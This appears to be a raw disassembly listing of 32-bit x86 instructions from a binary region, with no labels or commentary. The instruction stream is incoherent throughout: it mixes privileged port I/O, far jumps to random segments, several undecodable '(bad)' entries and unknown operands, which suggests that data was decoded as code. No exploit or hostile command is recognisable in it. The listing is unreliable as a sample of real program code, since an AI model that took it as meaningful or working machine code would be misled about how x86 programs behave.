  6a5bda:	stos   DWORD PTR es:[edi],eax
  6a5bdb:	push   ebx
  6a5bdc:	imul   edx
  6a5bde:	jno    0x6a5c2c
  6a5be0:	ja     0x6a5bdb
  6a5be2:	fldcw  WORD PTR [eax+edx*1+0x48]
  6a5be6:	mov    esp,DWORD PTR [ebx-0x61]
  6a5be9:	xchg   BYTE PTR [ebp-0x61],al
  6a5bec:	lods   eax,DWORD PTR ds:[esi]
  6a5bed:	outs   dx,DWORD PTR gs:[esi]
  6a5bef:	adc    dl,BYTE PTR [edi+eiz*2+0x74f84443]
  6a5bf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a5bf7:	mul    dh
  6a5bf9:	das    
  6a5bfa:	pop    es
  6a5bfb:	jmp    0x52ec:0x94ccaad4
  6a5c02:	inc    esi
  6a5c03:	mov    bh,0x9a
  6a5c05:	ja     0x6a5bdf
  6a5c07:	mov    ebx,0x3f6eb956
  6a5c0c:	jmp    0x9f994490
  6a5c11:	sbb    esi,DWORD PTR [esi-0x486e15a8]
  6a5c17:	inc    esi
  6a5c18:	and    al,0xa9
  6a5c1a:	dec    esi
  6a5c1b:	push   esi
  6a5c1c:	inc    ecx
  6a5c1d:	or     DWORD PTR [ebp+0x4d],esp
  6a5c20:	stc    
  6a5c21:	test   al,0xa
  6a5c23:	sub    BYTE PTR [edx],bh
  6a5c25:	repnz mov ecx,0x7f9d4bb9
  6a5c2b:	leave  
  6a5c2c:	or     DWORD PTR [eax],edi
  6a5c2e:	mov    al,bh
  6a5c30:	pop    ecx
  6a5c31:	mov    ?,eax
  6a5c33:	imul   ebx,DWORD PTR [ebp+0x6d],0xd9ac3450
  6a5c3a:	cmp    al,0xca
  6a5c3c:	outs   dx,DWORD PTR ds:[esi]
  6a5c3d:	lock jecxz 0x6a5bfd
  6a5c40:	lods   al,BYTE PTR ds:[esi]
  6a5c41:	jecxz  0x6a5c71
  6a5c43:	std    
  6a5c44:	pop    esi
  6a5c45:	xchg   edi,eax
  6a5c46:	and    DWORD PTR [ecx],esp
  6a5c48:	dec    edi
  6a5c49:	mov    edi,0x48abf3d6
  6a5c4e:	push   es
  6a5c4f:	and    BYTE PTR [ecx+0xff720ca],0x8c
  6a5c56:	into   
  6a5c57:	into   
  6a5c58:	sbb    BYTE PTR [ecx+0x7e6f9c6],cl
  6a5c5e:	mov    edi,0x527bee47
  6a5c63:	call   0x7f6857f2
  6a5c68:	mov    WORD PTR [ebx],ss
  6a5c6a:	jle    0x6a5c95
  6a5c6c:	mov    ?,WORD PTR [esi+0x4d]
  6a5c6f:	mov    ds:0x2020d7e4,al
  6a5c74:	nop
  6a5c75:	or     edx,edx
  6a5c77:	mov    dl,0xed
  6a5c79:	mov    DWORD PTR [ebp+0x51],eax
  6a5c7c:	mov    ebp,0xaa5a42a3
  6a5c81:	stos   BYTE PTR es:[edi],al
  6a5c82:	cmp    al,0x54
  6a5c84:	jecxz  0x6a5cc8
  6a5c86:	inc    BYTE PTR [eax-0x158a79ed]
  6a5c8c:	test   al,ah
  6a5c8e:	cmp    ch,bl
  6a5c90:	dec    ebp
  6a5c91:	stc    
  6a5c92:	jle    0x6a5c56
  6a5c94:	sub    dh,BYTE PTR [edi+0x2d]
  6a5c97:	or     eax,DWORD PTR ds:0x38916cd1
  6a5c9d:	cmp    BYTE PTR ds:0x8e7bb508,ah
  6a5ca3:	inc    esp
  6a5ca4:	repz in al,dx
  6a5ca6:	or     eax,0x4362e930
  6a5cab:	fisub  WORD PTR [ecx]
  6a5cad:	pop    ecx
  6a5cae:	jl     0x6a5ce2
  6a5cb0:	fist   WORD PTR [edx-0x1cfc2b43]
  6a5cb6:	in     eax,0x23
  6a5cb8:	arpl   WORD PTR [ecx+0x2d1846a0],bp
  6a5cbe:	mov    ss,WORD PTR [esi]
  6a5cc0:	mov    dh,0x78
  6a5cc2:	out    dx,al
  6a5cc3:	lock push edi
  6a5cc5:	mov    ds:0x3f8494d4,al
  6a5cca:	and    al,0xae
  6a5ccc:	ins    BYTE PTR es:[edi],dx
  6a5ccd:	xchg   ecx,eax
  6a5cce:	push   ebp
  6a5ccf:	mov    ds:0x88ac2bc2,al
  6a5cd4:	aam    0xd4
  6a5cd6:	mov    ebx,0xdd8ab8f4
  6a5cdb:	xor    al,0x14
  6a5cdd:	lods   eax,DWORD PTR ds:[esi]
  6a5cde:	and    eax,0xeb4f4e9b
  6a5ce3:	add    BYTE PTR [ebx-0x91e7663],bh
  6a5ce9:	imul   DWORD PTR [eax]
  6a5ceb:	xchg   edx,eax
  6a5cec:	cld    
  6a5ced:	out    dx,al
  6a5cee:	ret    
  6a5cef:	outs   dx,BYTE PTR ds:[esi]
  6a5cf0:	fist   WORD PTR [edi+0x7fb79dce]
  6a5cf6:	adc    al,0x4b
  6a5cf8:	in     al,dx
  6a5cf9:	fisub  WORD PTR es:[ebx]
  6a5cfc:	stos   BYTE PTR es:[edi],al
  6a5cfd:	pop    ebp
  6a5cfe:	pop    edi
  6a5cff:	push   0x43
  6a5d01:	xchg   esp,eax
  6a5d02:	inc    esp
  6a5d03:	lahf   
  6a5d04:	stc    
  6a5d05:	mov    ebx,0x8b0dad6c
  6a5d0a:	add    bl,BYTE PTR ds:0xc20aa7be
  6a5d10:	mov    edi,0x569fc29b
  6a5d15:	int3   
  6a5d16:	inc    BYTE PTR [edi+edi*2+0x3f]
  6a5d1a:	nop
  6a5d1b:	add    cl,BYTE PTR [ebx-0x2bf59768]
  6a5d21:	dec    ebx
  6a5d22:	mov    dh,0x47
  6a5d24:	sub    BYTE PTR [ecx-0x73],bl
  6a5d27:	dec    esp
  6a5d28:	xchg   ecx,ebp
  6a5d2a:	mov    ebp,0x7dcbaa9a
  6a5d2f:	jge    0x6a5da4
  6a5d31:	jne    0x6a5d35
  6a5d33:	scas   al,BYTE PTR es:[edi]
  6a5d34:	mov    BYTE PTR [esi-0x6165b861],al
  6a5d3a:	jnp    0x6a5d79
  6a5d3c:	cmp    ch,BYTE PTR [eax]
  6a5d3e:	cmp    ebx,ecx
  6a5d40:	and    DWORD PTR [edi],0xffffff9b
  6a5d43:	mov    esp,0xf48a92c4
  6a5d48:	je     0x6a5d47
  6a5d4a:	rcl    DWORD PTR [ebp+0x75],0x96
  6a5d4e:	lds    esp,FWORD PTR [ecx+esi*8-0x58]
  6a5d52:	xor    edx,edi
  6a5d54:	gs pop edx
  6a5d56:	add    ebp,DWORD PTR [ecx-0x6b]
  6a5d59:	cmp    eax,DWORD PTR [eax-0x106375f7]
  6a5d5f:	xor    al,0xbb
  6a5d61:	cmp    BYTE PTR [ebx-0x1be6cdb3],ch
  6a5d67:	xor    al,0x40
  6a5d69:	push   0x22
  6a5d6b:	cs xor al,0x13
  6a5d6e:	fwait
  6a5d6f:	data16 sbb BYTE PTR [eax+0x3b],dh
  6a5d73:	mov    ?,WORD PTR [esi+0xc86fca4]
  6a5d79:	daa    
  6a5d7a:	mov    es,WORD PTR [ebp-0x11c8d42f]
  6a5d80:	(bad)  
  6a5d81:	in     al,dx
  6a5d82:	sar    BYTE PTR ss:[edi+0x34],0x89
  6a5d87:	lods   eax,DWORD PTR ds:[esi]
  6a5d88:	jg     0x6a5d83
  6a5d8a:	push   ebx
  6a5d8b:	xor    DWORD PTR [ecx-0x3],esp
  6a5d8e:	jns    0x6a5d3c
  6a5d90:	scas   eax,DWORD PTR es:[edi]
  6a5d91:	int3   
  6a5d92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a5d93:	jle    0x6a5dee
  6a5d95:	add    ebx,ebp
  6a5d97:	and    BYTE PTR [ecx+esi*4+0x3],bh
  6a5d9b:	sbb    DWORD PTR [esi-0x45],esp
  6a5d9e:	mov    ch,dl
  6a5da0:	inc    ecx
  6a5da1:	cmp    BYTE PTR [ecx+0x754b1eff],0x4c
  6a5da8:	nop
  6a5da9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a5daa:	push   0x992b3d0d
  6a5daf:	mov    ds:0xd810546f,eax
  6a5db4:	out    dx,al
  6a5db5:	pop    ecx
  6a5db6:	movq   mm0,mm2
  6a5db9:	lahf   
  6a5dba:	in     eax,dx
  6a5dbb:	sub    eax,0x4b02b8ba
  6a5dc0:	loope  0x6a5df4
  6a5dc2:	out    dx,eax
  6a5dc3:	call   0x2b72:0x8669ef40
  6a5dca:	addr16 int 0x9f
  6a5dcd:	imul   edi,DWORD PTR [edx],0x66
  6a5dd0:	popf   
  6a5dd1:	xchg   ebp,eax
  6a5dd2:	aaa    
  6a5dd3:	sbb    al,0x6b
  6a5dd5:	lea    ebp,[ebx]
  6a5dd7:	imul   edi,DWORD PTR [eax],0xffffffc8
  6a5dda:	sbb    edi,DWORD PTR [esi+0x1e3337a7]
  6a5de0:	loopne 0x6a5dbd
  6a5de2:	out    dx,eax
  6a5de3:	or     eax,0xc74580a3
  6a5de8:	out    0x3f,eax
  6a5dea:	cmp    bh,BYTE PTR ds:0xdc997eb5
  6a5df0:	shl    DWORD PTR [ecx-0x9ea2dfd],cl
  6a5df6:	fadd   QWORD PTR ds:0xbd7fa41e
  6a5dfc:	mov    ds:0xbd5c40c9,ax
  6a5e02:	mov    DWORD PTR [ebx+0x49],edi
  6a5e05:	sbb    edx,ecx
  6a5e07:	imul   BYTE PTR [esi]
  6a5e09:	cmp    al,0xae
  6a5e0b:	xchg   ecx,eax
  6a5e0c:	in     al,dx
  6a5e0d:	and    bl,BYTE PTR [ebx]
  6a5e0f:	bound  ebp,QWORD PTR [ecx]
  6a5e11:	xor    dl,BYTE PTR [esi+0x49e91db3]
  6a5e17:	pop    edi
  6a5e18:	xor    BYTE PTR [ebx+ebp*1],0xa5
  6a5e1c:	adc    ch,BYTE PTR [ebx+ebp*2]
  6a5e1f:	neg    edi
  6a5e21:	fstp   QWORD PTR [ecx+0x7a9cea16]
  6a5e27:	sbb    DWORD PTR [esi+ebx*1-0x35cd0e7f],ecx
  6a5e2e:	push   ebp
  6a5e2f:	fwait
  6a5e30:	cwde   
  6a5e31:	cld    
  6a5e32:	sub    bl,BYTE PTR [edi-0x54]
  6a5e35:	pop    ebx
  6a5e36:	push   ebp
  6a5e37:	outs   dx,BYTE PTR ds:[esi]
  6a5e38:	and    edx,esp
  6a5e3a:	mov    al,0x8e
  6a5e3c:	(bad)  
  6a5e3d:	sti    
  6a5e3e:	pop    ds
  6a5e3f:	push   eax
  6a5e40:	fs pop esi
  6a5e42:	sub    al,0x63
  6a5e44:	pop    esi
  6a5e45:	xlat   BYTE PTR ds:[ebx]
  6a5e46:	cmp    edx,DWORD PTR [edi]
  6a5e48:	push   ecx
  6a5e49:	xor    ecx,DWORD PTR [eax]
  6a5e4b:	ds das 
  6a5e4d:	lods   eax,DWORD PTR ds:[esi]
  6a5e4e:	js     0x6a5e75
  6a5e50:	retf   0xe280
  6a5e53:	mov    edx,0xe32bea2
  6a5e58:	sbb    BYTE PTR [ecx],cl
  6a5e5a:	lea    edi,[eax+0x79bbb108]
  6a5e60:	pop    eax
  6a5e61:	ror    BYTE PTR [ecx-0x56],1
  6a5e64:	out    0x7b,al
  6a5e66:	lods   eax,DWORD PTR ds:[esi]
  6a5e67:	xor    al,0x4d
  6a5e69:	int3   
  6a5e6a:	push   es
  6a5e6b:	data16 gs scas al,BYTE PTR es:[edi]
  6a5e6e:	xchg   esi,eax
  6a5e6f:	test   eax,0x36f7e9f9
  6a5e74:	idiv   BYTE PTR [esi+0x4b]
  6a5e77:	inc    ebx
  6a5e78:	jae    0x6a5ee2
  6a5e7a:	pop    ss
  6a5e7b:	cmp    ebx,DWORD PTR [eax-0x41c33a2c]
  6a5e81:	icebp  
  6a5e82:	sbb    ah,BYTE PTR [ebx-0x7bb79584]
  6a5e88:	push   ds
  6a5e89:	or     BYTE PTR [edi-0x3f3644d6],0x41
  6a5e90:	inc    esp
  6a5e91:	sbb    edx,DWORD PTR [ecx+0x6cb9561e]
  6a5e97:	adc    eax,0x69d97038
  6a5e9c:	mov    WORD PTR [ecx+0x71f7f16a],gs
  6a5ea2:	shl    DWORD PTR [ebx+0x22168d30],1
  6a5ea8:	pop    ecx
  6a5ea9:	adc    BYTE PTR [esi],bh
  6a5eab:	aas    
  6a5eac:	jno    0x6a5f1c
  6a5eae:	fadd   DWORD PTR [esi+0x2e]
  6a5eb1:	lods   eax,DWORD PTR ds:[esi]
  6a5eb2:	cmp    ah,BYTE PTR [esi]
  6a5eb4:	(bad)  
  6a5eb5:	push   ss
  6a5eb6:	out    dx,al
  6a5eb7:	jbe    0x6a5e54
  6a5eb9:	in     al,0xde
  6a5ebb:	push   0xffffffaa
  6a5ebd:	inc    ebp
  6a5ebe:	push   es
  6a5ebf:	daa    
  6a5ec0:	push   ecx
  6a5ec1:	pop    ds
  6a5ec2:	imul   ecx,esp,0xfffffff0
  6a5ec5:	in     eax,0x65
  6a5ec7:	scas   al,BYTE PTR es:[edi]
  6a5ec8:	push   esp
  6a5ec9:	jbe    0x6a5e6e
  6a5ecb:	(bad)  
  6a5ecd:	push   es
  6a5ece:	test   al,0xc2
  6a5ed0:	jmp    0x407e:0xf75fb9e2
  6a5ed7:	adc    al,0x5a
  6a5ed9:	in     eax,0x90
  6a5edb:	pop    ebp
  6a5edc:	pop    esi
  6a5edd:	push   ds
  6a5ede:	jnp    0x6a5f4a
  6a5ee0:	jmp    0x58ee6de2
  6a5ee5:	fwait
  6a5ee6:	in     eax,0xe5
  6a5ee8:	outs   dx,BYTE PTR ds:[esi]
  6a5ee9:	iret   
  6a5eea:	call   0x17b:0xa3c6727b
  6a5ef1:	sbb    esi,DWORD PTR [ebx+ebp*2]
  6a5ef4:	(bad)  
  6a5ef5:	fwait
  6a5ef6:	jecxz  0x6a5ef5
  6a5ef8:	mov    cl,0xe0
  6a5efa:	mov    ch,0x25
  6a5efc:	xchg   edi,eax
  6a5efd:	test   eax,0xfd610d86
  6a5f02:	retf   0xb2df
  6a5f05:	and    ebp,ecx
  6a5f07:	fs jl  0x6a5f1f
  6a5f0a:	pop    ecx
  6a5f0b:	sub    ebx,DWORD PTR [ebp+0x16d4da10]
  6a5f11:	fwait
  6a5f12:	or     ecx,edx
  6a5f14:	mov    ebp,0x257c339f
  6a5f19:	cmp    ebx,DWORD PTR [edi+edx*8]
  6a5f1c:	add    eax,0x3b604b3d
  6a5f21:	out    0xc7,eax
  6a5f23:	push   ss
  6a5f24:	aam    0x44
  6a5f26:	add    eax,0x2f901a1c
  6a5f2b:	dec    esi
  6a5f2c:	push   0x43d9636e
  6a5f31:	jnp    0x6a5f29
  6a5f33:	imul   al
  6a5f35:	jbe    0x6a5f66
  6a5f37:	icebp  
  6a5f38:	test   BYTE PTR [edx-0x50],al
  6a5f3b:	xor    dl,BYTE PTR [edi-0x7d]
  6a5f3e:	add    esi,edx
  6a5f40:	mov    ah,0x78
  6a5f42:	xlat   BYTE PTR ds:[ebx]
  6a5f43:	in     al,0x8c
  6a5f45:	into   
  6a5f46:	(bad)  
  6a5f47:	and    al,0xc8
  6a5f49:	push   0x4e
  6a5f4b:	xor    ebx,DWORD PTR [ebp-0x5f]
  6a5f4e:	xor    DWORD PTR [eax+0x5f],edx
  6a5f51:	retf   0x39c9
  6a5f54:	push   ebp
  6a5f55:	jns    0x6a5fa7
  6a5f57:	imul   edx,DWORD PTR [edx+0x23],0x2b6fd89e
  6a5f5e:	cmp    al,BYTE PTR [ebx+ebx*8+0x12]
  6a5f62:	hlt    
  6a5f63:	inc    ebx
  6a5f64:	arpl   WORD PTR [edx-0x1332557b],bp
  6a5f6a:	mov    DWORD PTR [edi+0x607aa4ad],edi
  6a5f70:	sub    esp,DWORD PTR [ecx-0x29]
  6a5f73:	dec    eax
  6a5f74:	xor    al,BYTE PTR [esi]
  6a5f76:	sub    al,0x36
  6a5f78:	push   esi
  6a5f79:	jl     0x6a5fe7
  6a5f7b:	sbb    bl,al
  6a5f7d:	loope  0x6a5fe5
  6a5f7f:	mov    ds:0xdf861cdb,al
  6a5f84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a5f85:	clc    
  6a5f86:	imul   ebx,edi,0xc06968ca
  6a5f8c:	mov    cl,0x14
  6a5f8e:	pop    ss
  6a5f8f:	jge    0x6a5fec
  6a5f91:	sub    ecx,DWORD PTR [ecx-0x255d7485]
  6a5f97:	add    al,0x3a
  6a5f99:	mov    ds:0xd5d751c7,al
  6a5f9e:	push   cs
  6a5f9f:	or     al,0x61
  6a5fa1:	cld    
  6a5fa2:	pop    esi
  6a5fa3:	pop    ebx
  6a5fa4:	and    DWORD PTR [eax+0x6],ebp
  6a5fa7:	pop    ebp
  6a5fa8:	push   edi
  6a5fa9:	test   BYTE PTR [eax-0x40],ch
  6a5fac:	mov    cs,WORD PTR [eax-0x30580380]
  6a5fb2:	call   0x53d5:0x61ddc6c3
  6a5fb9:	int    0x5d
  6a5fbb:	scas   al,BYTE PTR es:[edi]
  6a5fbc:	aam    0x36
  6a5fbe:	push   ebx
  6a5fbf:	mov    ah,0x3
  6a5fc1:	add    eax,0x16cd8b96
  6a5fc6:	out    0x22,al
  6a5fc8:	push   ebx
  6a5fc9:	imul   esi,DWORD PTR [ebx],0x65e2eb7
  6a5fcf:	mov    ch,0x2b
  6a5fd1:	loop   0x6a5faa
  6a5fd3:	popa   
  6a5fd4:	mov    eax,es:0xd43c2ef2
  6a5fda:	jmp    0x42e5:0x9cc6348f
  6a5fe1:	push   edi
  6a5fe2:	push   ecx
  6a5fe3:	and    ch,cl
  6a5fe5:	hlt    
  6a5fe6:	add    edi,DWORD PTR ds:0x7c3bfa3e
  6a5fec:	sahf   
  6a5fed:	test   al,0x2a
  6a5fef:	jo     0x6a5f9e
  6a5ff1:	xchg   edi,eax
  6a5ff2:	pop    ebp
  6a5ff3:	pop    ebp
  6a5ff4:	adc    DWORD PTR [ecx+0x7d],edi
  6a5ff7:	out    0x4a,eax
  6a5ff9:	out    dx,al
  6a5ffa:	retf   
  6a5ffb:	jg     0x6a5ffa
  6a5ffd:	xlat   BYTE PTR ds:[ebx]
  6a5ffe:	aam    0x2a
  6a6000:	fwait
  6a6001:	pop    edx
  6a6002:	dec    ebp
  6a6003:	push   0xa43a3bab
  6a6008:	xor    eax,0x6d26cbbd
  6a600d:	pop    ebx
  6a600e:	jecxz  0x6a5ff9
  6a6010:	ins    DWORD PTR es:[edi],dx
  6a6011:	dec    BYTE PTR [edx+0x5b]
  6a6014:	pop    edi
  6a6015:	jno    0x6a6024
  6a6017:	rol    DWORD PTR [ebp+esi*2-0x19b026e3],1
  6a601e:	(bad)  
  6a601f:	push   ecx
  6a6020:	fadd   DWORD PTR [esi+0x11a29531]
  6a6026:	push   edi
  6a6027:	sbb    eax,0x59e29749
  6a602c:	sti    
  6a602d:	rcr    ebp,0x67
  6a6030:	imul   edx,esp,0x1fcfb414
  6a6036:	xchg   edx,eax
  6a6037:	inc    edi
  6a6039:	aad    0xe0
  6a603b:	pop    ebx
  6a603c:	adc    al,0x2b
  6a603e:	cli    
  6a603f:	xchg   ebp,eax
  6a6040:	fst    QWORD PTR ds:0xafce920d
  6a6046:	pop    esi
  6a6047:	mov    BYTE PTR ds:0xc04293e1,dh
  6a604d:	mov    edi,0x83eebaa2
  6a6052:	mov    ebx,0x69398da6
  6a6057:	mov    ecx,0x1d14e876
  6a605c:	xor    DWORD PTR [ebp-0x39c2a932],edi
  6a6062:	(bad)  
  6a6063:	mov    eax,ds:0xac4f4561
  6a6068:	cli    
  6a6069:	jmp    0xc881798c
  6a606e:	cmc    
  6a606f:	xchg   ebx,eax
  6a6070:	push   edx
  6a6071:	push   esp
  6a6072:	xchg   BYTE PTR [edi+0x3c],bl
  6a6075:	icebp  
  6a6076:	jno    0x6a6015
  6a6078:	add    ch,BYTE PTR [edx]
  6a607a:	aam    0xeb
  6a607c:	scas   al,BYTE PTR es:[edi]
  6a607d:	daa    
  6a607e:	jns    0x6a60a4
  6a6080:	sub    DWORD PTR [ebx+0x4991c573],edx
  6a6086:	outs   dx,BYTE PTR ds:[esi]
  6a6087:	lods   al,BYTE PTR ds:[esi]
  6a6088:	in     eax,dx
  6a6089:	ret    
  6a608a:	jmp    0x9ece78c0
  6a608f:	aad    0x30
  6a6091:	popa   
  6a6092:	sub    al,0x1a
  6a6094:	cmp    bl,dl
  6a6096:	mov    ebp,0x399cd046
  6a609b:	popa   
  6a609c:	jae    0x3838b109
  6a60a2:	imul   esp,DWORD PTR [esi+ebx*8+0x4eac3e4b],0xc1b2ff5e
  6a60ad:	clc    
  6a60ae:	ins    BYTE PTR es:[edi],dx
  6a60af:	lea    eax,[edx+0x2e]
  6a60b2:	xor    eax,0x9391c7ab
  6a60b7:	dec    esi
  6a60b8:	or     al,0xfc
  6a60ba:	aad    0x14
  6a60bc:	cmp    BYTE PTR [eax],0xfc
  6a60bf:	aaa    
  6a60c0:	adc    ebx,ecx
  6a60c2:	fstp   DWORD PTR [edx-0x8]
  6a60c5:	pop    edx
  6a60c6:	fwait
  6a60c7:	mov    cl,0x92
  6a60c9:	repz fisttp DWORD PTR [ecx-0x5202a0f8]
  6a60d0:	sbb    DWORD PTR [esi-0x58155602],0x843fb824
  6a60da:	aam    0xd1
  6a60dc:	sub    eax,0xda9e6648
  6a60e1:	(bad)  
  6a60e2:	in     eax,0x2
  6a60e4:	mov    ecx,0x70c23495
  6a60e9:	and    BYTE PTR [ebp-0x18f32958],ah
  6a60ef:	addr16 jg 0x6a6133
  6a60f2:	stc    
  6a60f3:	cmp    ah,bh
  6a60f5:	sub    BYTE PTR [ebx-0x6c],dl
  6a60f8:	pop    ebp
  6a60f9:	enter  0x664d,0xc6
  6a60fd:	add    DWORD PTR [ebp-0x47],ebx
  6a6100:	push   cs
  6a6101:	cld    
  6a6102:	cmp    dh,BYTE PTR [ebx+0x5b]
  6a6105:	add    ebp,DWORD PTR [ebp+0x3e]
  6a6108:	jmp    0x85655177
  6a610d:	es jo  0x6a6137
  6a6110:	sbb    al,0x3f
  6a6112:	or     DWORD PTR [ebp-0x54],esp
  6a6115:	or     al,0x55
  6a6117:	sbb    eax,0x8c2f7e2d
  6a611c:	jmp    FWORD PTR [ecx+0x3d]
  6a611f:	ja     0x6a60c6
  6a6121:	icebp  
  6a6122:	lahf   
  6a6123:	mov    ds:0x3f43a150,eax
  6a6128:	mov    esi,0x32ce63eb
  6a612d:	adc    ah,cl
  6a612f:	daa    
  6a6130:	clc    
  6a6131:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a6132:	in     eax,dx
  6a6133:	mov    dh,0x26
  6a6135:	xor    al,0xc3
  6a6138:	xchg   BYTE PTR [edx-0x786f0ac],bh
  6a613e:	call   DWORD PTR [esi]
  6a6140:	mov    al,0xeb
  6a6142:	pop    ds
  6a6143:	pop    ss
  6a6144:	push   ebp
  6a6145:	jnp    0x6a60fb
  6a6147:	rcr    DWORD PTR [eax-0x484b1c9d],1
  6a614d:	pop    esi
  6a614e:	or     DWORD PTR [ecx-0x2bde4ba3],ecx
  6a6154:	or     BYTE PTR [edi-0x5d],dl
  6a6157:	dec    ecx
  6a6158:	(bad)  
  6a6159:	and    edi,DWORD PTR [ebx]
  6a615b:	add    dl,BYTE PTR [ebx-0x7f15c445]
  6a6161:	retf   0xfa2d
  6a6164:	lds    esp,FWORD PTR [eax-0x56]
  6a6167:	add    cl,BYTE PTR [ecx+0x7fa87d2d]
  6a616d:	lahf   
  6a616e:	mov    al,ds:0x42dda169
  6a6173:	aaa    
  6a6174:	cmp    DWORD PTR [esi-0x627bd05f],eax
  6a617a:	xlat   BYTE PTR ds:[ebx]
  6a617b:	fnstenv [eax-0x2f]
  6a617e:	into   
  6a617f:	out    0x24,al
  6a6181:	lds    ebp,FWORD PTR [eax]
  6a6183:	mov    bh,0x34
  6a6185:	pop    eax
  6a6186:	neg    DWORD PTR [edi+ebp*8+0x4cd0e706]
  6a618d:	adc    bl,BYTE PTR [ebx]
  6a618f:	mov    ds:0xbc37b2af,al
  6a6194:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a6195:	and    al,ah
  6a6197:	sbb    esi,DWORD PTR [eax]
  6a6199:	jnp    0x6a61a4
  6a619b:	and    ebp,DWORD PTR [ebx]
  6a619d:	dec    ebx
  6a619e:	mov    dl,0xb
  6a61a0:	mov    dh,al
  6a61a2:	aam    0x21
  6a61a4:	pop    edi
  6a61a5:	jo     0x6a614d
  6a61a7:	imul   esp,DWORD PTR [eax-0xb7ff8a0],0x533fb6b
  6a61b1:	mov    ebx,0x9db0f22f
  6a61b6:	lahf   
  6a61b7:	stos   DWORD PTR es:[edi],eax
  6a61b8:	das    
  6a61b9:	stos   DWORD PTR es:[edi],eax
  6a61ba:	daa    
  6a61bb:	push   edi
  6a61bc:	push   0x8bb91ae3
  6a61c1:	rdpmc  
  6a61c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a61c4:	xlat   BYTE PTR ds:[ebx]
  6a61c5:	repnz or dl,bl
  6a61c8:	rcr    BYTE PTR ds:[ebx-0x10],cl
  6a61cc:	or     edi,eax
  6a61ce:	push   edx
  6a61cf:	inc    ecx
  6a61d0:	push   ebp
  6a61d1:	adc    eax,0x4bb3f846
  6a61d6:	push   edx
  6a61d7:	dec    eax
  6a61d8:	mov    ch,0x26
  6a61da:	pop    ebp
  6a61db:	xchg   ecx,eax
  6a61dc:	cdq    
  6a61dd:	mov    dh,0x9e
  6a61df:	(bad)
  6a61e4:	test   eax,0x1c3c7d61
  6a61e9:	sbb    eax,0x2b4c08d6
  6a61ee:	xchg   edi,eax
  6a61ef:	xor    BYTE PTR [edx],al
  6a61f1:	push   ss
  6a61f2:	call   0x95705e47
  6a61f7:	iret   
  6a61f8:	or     BYTE PTR [edi+ebp*8+0x10],cl
  6a61fc:	sub    BYTE PTR [ecx+ebx*8-0x7a269f89],0xef
  6a6204:	mov    ebp,0x9eb1cfd6
  6a6209:	mov    ch,0xf
  6a620b:	ror    DWORD PTR [eax+0x15abf783],0x3c
  6a6212:	(bad)  
  6a6213:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a6214:	(bad)  
  6a6215:	fadd   st(2),st
  6a6217:	jbe    0x6a61d2
  6a6219:	iret   
  6a621a:	lds    eax,FWORD PTR [ebx+0x62847295]
  6a6220:	mov    al,0x35
  6a6222:	push   edi
  6a6223:	in     eax,dx
  6a6224:	jp     0x6a6228
  6a6226:	or     eax,0x352a108c
  6a622b:	loopne 0x6a61cb
  6a622d:	xchg   esp,eax
  6a622e:	sahf   
  6a622f:	in     al,0x7a
  6a6231:	inc    esp
  6a6232:	xchg   esp,eax
  6a6233:	or     esi,DWORD PTR [edi+0x7d19a518]
  6a6239:	cld    
  6a623a:	icebp  
  6a623b:	jmp    0x6a61cc
  6a623d:	fsubr  QWORD PTR [ebp+0x5b]
  6a6240:	mov    esp,0x261ab7e6
  6a6245:	push   eax
  6a6246:	cwde   
  6a6247:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a6248:	aas    
  6a6249:	lock out dx,eax
  6a624b:	addr16 ret 0x8af6
  6a624f:	pusha  
  6a6250:	aad    0x4e
  6a6252:	mov    eax,0x4f108236
  6a6257:	int3   
  6a6258:	jns    0x6a61f0
  6a625a:	in     al,dx
  6a625b:	out    dx,al
  6a625c:	sar    eax,0x63
  6a625f:	inc    ebx
  6a6260:	shl    dl,1
  6a6262:	ins    DWORD PTR es:[edi],dx
  6a6263:	cmp    bh,BYTE PTR [ebx+0x5725cc93]
  6a6269:	clc    
  6a626a:	clc    
  6a626b:	jb     0x6a62c2
  6a626d:	ins    BYTE PTR es:[edi],dx
  6a626e:	jp     0x6a627d
  6a6270:	or     edi,DWORD PTR [edx-0x485c329f]
  6a6276:	test   DWORD PTR [ebx+0x620cd0a8],eax
  6a627c:	jnp    0x6a622e
  6a627e:	aas    
  6a627f:	std    
  6a6280:	xor    eax,0x540b59b7
  6a6285:	(bad)  
  6a6286:	outs   dx,BYTE PTR ds:[esi]
  6a6287:	dec    eax
  6a6288:	gs inc edi
  6a628a:	push   esp
  6a628b:	inc    esp
  6a628c:	daa    
  6a628d:	jbe    0x6a62cd
  6a628f:	pop    edx
  6a6290:	add    edx,esi
  6a6292:	icebp  
  6a6293:	in     eax,0xf4
  6a6295:	ja     0x6a622d
  6a6297:	sbb    BYTE PTR [ebp-0x4e5b5dda],dl
  6a629d:	and    BYTE PTR [edx*8+0x37eace44],0x86
  6a62a5:	clc    
  6a62a6:	and    DWORD PTR [eax+0x6fd0364a],esp
  6a62ac:	mov    edx,DWORD PTR [ebx]
  6a62ae:	push   eax
  6a62af:	addr16 and ebx,0xffffff8d
  6a62b3:	daa    
  6a62b4:	xor    BYTE PTR ds:0x41a4a49b,0xb2
  6a62bb:	ins    BYTE PTR es:[edi],dx
  6a62bc:	mov    ch,BYTE PTR [eax]
  6a62be:	fistp  QWORD PTR [ebx+0x248c4125]
  6a62c4:	mov    esp,0x3ffd5ba9
  6a62c9:	push   eax
  6a62ca:	and    eax,0xfec16ea9
  6a62cf:	cmp    eax,0x1cba9fe
  6a62d4:	scas   al,BYTE PTR es:[edi]
  6a62d5:	sub    ch,BYTE PTR [esi-0x5058e090]
  6a62db:	aad    0xa1
  6a62dd:	mul    BYTE PTR [ecx-0x376f733e]
  6a62e3:	xchg   edi,eax
  6a62e4:	cmp    al,0xd1
  6a62e6:	in     al,0x0
  6a62e8:	dec    ecx
  6a62e9:	adc    eax,0x6bac8f1e
  6a62ee:	fucomip st,st(7)
  6a62f0:	adc    eax,0xb860cd7d
  6a62f5:	add    esi,DWORD PTR fs:0x16b2b70b
  6a62fc:	xor    ah,ch
  6a62fe:	mov    eax,0xb226cf74
